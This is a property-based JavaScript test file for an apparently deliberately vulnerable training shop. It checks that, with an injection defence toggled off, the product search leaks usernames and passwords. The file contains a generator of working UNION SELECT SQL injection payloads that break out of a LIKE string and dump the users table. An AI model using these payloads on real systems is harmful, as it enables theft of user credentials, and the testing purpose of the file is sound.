// test/products.exfiltration.property.test.js
// Property-based test for the A05 Injection on GET /products?q=<payload>.
//
// The vulnerable product search concatenates the raw `q` into:
//   SELECT id, name, description, price FROM products WHERE name LIKE '%<q>%'
// a 4-column SELECT. With the A05_injection defense OFF the raw string is sent
// to the backend untouched, so a 4-column `UNION SELECT ... FROM users` payload
// exfiltrates rows from the users table. The rendered products.ejs shows the
// 2nd column (name) and 3rd column (description) for each row, so mapping
// username -> 2nd column and password -> 3rd column surfaces seed user data in
// the HTML body.
//
// The toggle is stubbed in memory via setToggle (no writes to defenses.json)
// and cleared with resetToggles() in afterEach. Nothing in production is
// modified; this file only observes behaviour. Backend is DB_BACKEND=memory.
const { test, afterEach } = require("node:test");
const assert = require("node:assert/strict");
const fc = require("fast-check");
const { createTestApp, agent, setToggle, resetToggles, SEED } = require("./helpers");

const RUNS = 100;

// Seed user identifiers that must appear in the exfiltrated output. Usernames
// map to the 2nd SELECT column (rendered as the product "name"); passwords map
// to the 3rd column (rendered as the "description").
const SEED_USERNAMES = Object.keys(SEED.users); // ["admin","alice","bob","carol"]
const SEED_PASSWORDS = Object.values(SEED.credentials);

afterEach(resetToggles);

// A generator producing VALID 4-column UNION exfiltration payloads that each
// pull id/username/password from the users table, matching the shape of the
// vulnerable products SELECT (id, name, description, price). The variations
// keep the injection authentic while exercising different surface forms:
//   - comment terminator style ("-- " vs "--" vs "-- -")
//   - whitespace between tokens
//   - the 4th filler column value (a literal or a real users column; note the
//     users table has no `price` column, so the filler must not reference one)
//   - the breakout quote prefix (empty string or a non-quote token that won't
//     match a product, so the left side of the UNION stays empty)
//
// The prefix never contains a single quote: a quote there would be escaped as
// part of the LIKE literal ('' is a literal quote in SQL) and the breakout
// would not occur, which would not be a valid UNION exfiltration.
function unionPayloadArb() {
  return fc
    .record({
      ws: fc.constantFrom(" ", "  ", "\t", " \n "),
      comment: fc.constantFrom("-- ", "--", "-- -", "--x"),
      filler: fc.constantFrom("0", "1", "99.9", "role"),
      prefix: fc.constantFrom("", "zzz", "x"),
    })
    .map(({ ws, comment, filler, prefix }) => {
      // Breakout: close the LIKE string literal, UNION a users SELECT, comment
      // out the trailing "%'". Column order id,username,password,<filler>
      // aligns with id,name,description,price so username/password render.
      return (
        prefix +
        "'" +
        ws +
        "UNION" +
        ws +
        "SELECT" +
        ws +
        "id," +
        ws +
        "username," +
        ws +
        "password," +
        ws +
        filler +
        ws +
        "FROM" +
        ws +
        "users" +
        ws +
        comment
      );
    });
}

// Feature: sangyshop-postgres-secret-ver-codigo, Property 6: Authentic SQLi in search with the defense off (exfiltration)
// Validates: Requirements 3.1, 3.3
test("Property 6: with A05 OFF, a UNION SELECT payload exfiltrates users rows (200 + users data in body)", async () => {
  const app = await createTestApp();
  setToggle("A05_injection", false);

  await fc.assert(
    fc.asyncProperty(unionPayloadArb(), async (payload) => {
      const res = await agent(app).get("/products").query({ q: payload });

      // Authentic exfiltration: the search succeeds (200) and the rendered
      // body carries at least one seed user's data (a username AND a password
      // surfaced from the users table).
      assert.equal(res.status, 200);

      const body = res.text;
      const leakedUsername = SEED_USERNAMES.some((u) => body.includes(u));
      const leakedPassword = SEED_PASSWORDS.some((p) => body.includes(p));

      assert.ok(
        leakedUsername && leakedPassword,
        "response body must contain exfiltrated users data (username + password)"
      );
    }),
    { numRuns: RUNS }
  );

  resetToggles();
});
